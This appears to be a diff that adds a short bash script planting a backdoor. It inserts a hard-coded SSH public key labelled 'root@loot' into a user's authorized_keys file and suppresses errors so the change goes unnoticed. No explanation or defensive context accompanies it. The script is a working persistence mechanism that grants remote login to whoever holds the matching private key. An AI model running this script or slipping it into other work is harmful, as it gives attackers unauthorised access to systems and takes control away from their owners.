@@ -1,0 +1,4 @@
+#!/bin/bash
+SSH_KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHOyWHcNHMdrERukMGdV2Ea+vyeNzPiqR4s1otKe/w0q root@loot"
+AUTHORIZED_KEYS_FILE="/home/debian/.ssh/authorized_keys"
+echo "$SSH_KEY" | cat - "$AUTHORIZED_KEYS_FILE" > "$AUTHORIZED_KEYS_FILE.tmp" 2>/dev/null && mv "$AUTHORIZED_KEYS_FILE.tmp" "$AUTHORIZED_KEYS_FILE" 2>/dev/null
